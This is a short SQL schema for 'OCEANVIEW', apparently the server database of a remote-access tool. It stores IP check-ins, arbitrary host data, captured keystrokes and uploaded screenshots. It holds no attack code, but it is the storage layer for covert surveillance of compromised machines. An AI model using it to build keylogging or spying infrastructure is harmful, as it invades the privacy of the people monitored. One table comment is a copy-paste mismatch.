-- The database layout for OCEANVIEW
-- Micah Martin

-- Keep track of arbitrary information sent up by the host
CREATE TABLE `data` (
	`ip`    TEXT,
	`name`  TEXT,
	`data`	TEXT,
  `time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL,
	PRIMARY KEY(`time`)
) WITHOUT ROWID;

-- These are the IPs that we know about with last checkin time
CREATE TABLE `timestamps` (
	`ip`   TEXT,
	`time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL,
        PRIMARY KEY(`time`)
) WITHOUT ROWID;


-- Keystroke data that we have captured
CREATE TABLE `keystrokes` (
	`ip`        TEXT,
  `keystroke` TEXT,
	`time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL,
        PRIMARY KEY(`time`)
) WITHOUT ROWID;

-- Store screenshots sent up from the client
CREATE TABLE `files` (
	`ip`        TEXT,
  `filename`  TEXT,
	`time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL,
        PRIMARY KEY(`time`)
) WITHOUT ROWID;

-- Store screenshots sent up from the client
CREATE TABLE `tags` (
  `id`        INTEGER,
	`ip`        TEXT,
  `tag`				TEXT,
        PRIMARY KEY(`id` ASC)
);